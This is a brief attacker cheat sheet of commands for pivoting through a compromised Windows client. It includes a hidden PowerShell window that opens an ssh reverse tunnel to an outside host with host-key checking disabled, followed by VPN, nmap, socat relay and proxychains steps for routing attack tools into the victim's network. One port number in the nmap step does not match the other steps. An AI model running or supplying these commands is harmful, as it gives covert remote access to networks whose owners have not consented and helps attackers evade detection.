### Start ssh connection on compromised client
```
Start-Process -FilePath "powershell" -ArgumentList " -w hidden -c ssh -p 22 -o 'StrictHostKeyChecking=no' -i $HOME\.ssh\<privateKey> -N -R 9050 <user>@<sshRhost>"
```

### Start vpn from local attacker machine to ssh server
```
openvpn --config <file>.ovpn
```

### Check if port 9050 on ssh server is reachable from attacker machine
```
nmap -p 9080 -Pn -n <sshRhost>
```

### If not redirect traffic on ssh server
```
socat TCP-LISTEN:9051,fork TCP:localhost:9050
```

### Reconfigure listener port on attacker machine
```
sed -i 's/ 9050/ 9051/g' /etc/proxychains4.conf
```

### Execute tools on attacker machine
```
proxychains firefox
```

### Add DNS resolver to proxy
```
/usr/lib/proxychains3/proxyresolv
```

